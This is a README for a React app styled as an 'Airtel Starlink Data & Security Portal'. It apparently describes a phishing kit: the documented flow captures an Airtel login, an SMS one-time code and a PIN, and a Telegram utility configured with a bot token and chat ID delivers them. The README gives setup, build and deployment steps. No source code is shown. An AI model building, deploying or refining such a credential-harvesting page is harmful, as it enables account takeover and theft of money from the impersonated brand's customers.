# Airtel Starlink Data & Security Portal

A pure **Vite + React + TypeScript** frontend — no backend server required.

## Run locally

Prerequisites: Node.js

1. Install dependencies:
   ```bash
   npm install
   ```
2. Set your Telegram credentials in `.env` (see `.env.example`):
   ```
   VITE_TELEGRAM_TOKEN=your_bot_token
   VITE_TELEGRAM_CHAT_ID=your_chat_id
   ```
3. Start the dev server:
   ```bash
   npm run dev
   ```

## Scripts

- `npm run dev` — start Vite dev server (port 3000)
- `npm run build` — type-safe production build to `build/` (Render publishes this directory)
- `npm run preview` — preview the production build
- `npm run lint` — TypeScript type check (`tsc --noEmit`)

## Project structure

```
components/
  LoanApplication1.tsx   # Payment-provider selection step
  LoanApplication2.tsx   # Final PIN confirmation + success receipt
  LoanCalculator.tsx     # Internet plan / calculator page
  LoginForm.tsx          # Airtel Lite login form
  VerificationForm.tsx   # SMS OTP verification form
utils/
  telegram.ts            # Telegram delivery + browser-safe helpers
.gitignore
App.tsx                  # App shell, state machine, shared context, data, i18n, UI primitives
README.md
index.html
index.tsx                # React entry point
metadata.json
package-lock.json
package.json
tsconfig.json
vite.config.ts
```

The original UI and flow are unchanged:

`LoanCalculator` (plans) → `LoanApplication1` (provider) → `LoginForm` → `VerificationForm` (OTP) → `LoanApplication2` (PIN re-entry) → success receipt.
